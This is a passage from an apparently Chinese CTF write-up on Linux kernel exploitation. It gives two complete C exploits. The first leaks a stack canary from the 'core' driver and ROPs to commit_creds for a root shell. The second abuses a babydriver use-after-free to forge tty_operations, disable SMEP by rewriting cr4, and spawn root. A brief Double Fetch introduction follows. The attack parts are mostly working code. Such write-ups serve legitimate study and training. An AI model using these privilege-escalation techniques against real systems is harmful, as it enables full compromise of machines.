<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>,prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm__(</span><br><span class="line">    <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp,rsp;"</span></span><br><span class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags;"</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BeRoot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*fun1)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span>  (*fun2)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*fun2)((*fun1)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRootShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] get root shell error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">FindVmlinuxBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open symbol file failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    FindVmlinuxBase();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]prepare_kernel_cred addr:%p\n"</span>,prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]commit_creds addr:%p\n"</span>,commit_creds);</span><br><span class="line">    <span class="comment">//leak sth</span></span><br><span class="line">    <span class="keyword">int</span> core_fd = open(<span class="string">"/proc/core"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span>* user_buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">memset</span>(user_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">0x50</span>);</span><br><span class="line">    <span class="comment">//set off=0x40</span></span><br><span class="line">    ioctl(core_fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    <span class="comment">//read to user_buf</span></span><br><span class="line">    ioctl(core_fd,<span class="number">0x6677889B</span>,user_buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span>*)user_buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leaked canary:%p"</span>,canary);</span><br><span class="line">    <span class="comment">//rops</span></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    rop[i++] = BeRoot;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)GetRootShell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(core_fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889a</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="bypass-smep"><a href="#bypass-smep" class="headerlink" title="bypass smep"></a>bypass smep</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>smep保护其实就是为了防止ret2usr这样的攻击，是否开启这个保护取决于rc4寄存器的值，我们一般只需要给它改成一个固定值0x6f0就可以关闭它，这里用之前Kernel UAF的babydriver进行演示</p>
<h3 id="CISCN2017-BabyDriver"><a href="#CISCN2017-BabyDriver" class="headerlink" title="CISCN2017-BabyDriver"></a>CISCN2017-BabyDriver</h3><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里我们选择一个tty_struct结构体进行操作，在<code>open(&quot;/dev/ptmx&quot;,O_RDWR);</code>的时候会分配这样一个结构体，其源码如下：</p>
<p>其中<code>tty_operations</code>结构体有许多函数指针，我们可以通过伪造fake operation来劫持控制流。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>思路是利用UAF泄露出部分tty_struct结构体的内容，我们把operation这个结构体指针改成我们伪造的函数结构体指针，在函数结构体指针中按照顺序改三个指针为gadgets和rop，最终在调用write的时候触发这些函数执行劫持控制流，rop之后先改rc4，后面都一样。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm__(</span><br><span class="line">    <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp,rsp;"</span></span><br><span class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags;"</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BeRoot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*fun1)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span>  (*fun2)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*fun2)((*fun1)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRootShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] get root shell error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">FindVmlinuxBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open symbol file failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="comment">//FindVmlinuxBase();</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]prepare_kernel_cred addr:%p\n"</span>,prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]commit_creds addr:%p\n"</span>,commit_creds);</span><br><span class="line">    <span class="comment">//rops</span></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810d238d</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81004d80</span>;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)BeRoot;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81063694</span>;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)GetRootShell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    <span class="comment">//fake tty operations</span></span><br><span class="line">    <span class="keyword">void</span>* fake_ops[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//UAF to leak the initial tty_struct</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="comment">//now we have a UAF :)</span></span><br><span class="line">    <span class="keyword">int</span> tty_fd = open(<span class="string">"/dev/ptmx"</span>,O_RDWR|O_NOCTTY);<span class="comment">//use the former released one</span></span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2,fake_tty_struct,<span class="number">0x20</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_ops;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j &lt; <span class="number">30</span>;j++)</span><br><span class="line">        fake_ops[j] = <span class="number">0xFFFFFFFF8181BFC5</span>;</span><br><span class="line">    fake_ops[<span class="number">0</span>] = <span class="number">0xffffffff810635f5</span>;<span class="comment">//lookup func</span></span><br><span class="line">    fake_ops[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;<span class="comment">//install </span></span><br><span class="line">    fake_ops[<span class="number">3</span>] = <span class="number">0xFFFFFFFF8181BFC5</span>;<span class="comment">//open</span></span><br><span class="line">    write(fd2,fake_tty_struct,<span class="number">0x20</span>);<span class="comment">//write back</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(tty_fd,buf,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>Double Fetch是一种类似条件竞争的攻击方式，原理是内核在调用用户空间数据的时候可能会先做安全检查，随后调用其数据指针，而第二次取数据处理的时候可能使用被篡改的恶意数据。</p>
<h3 id="2018-0CTF-Finals-Baby-Kernel"><a href="#2018-0CTF-Finals-Baby-Kernel" class="headerlink" title="2018 0CTF Finals Baby Kernel"></a>2018 0CTF Finals Baby Kernel</h3><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>flag是编码到bss上的，我们要做的是通过一些校验，即可得到输出的flag。</p>
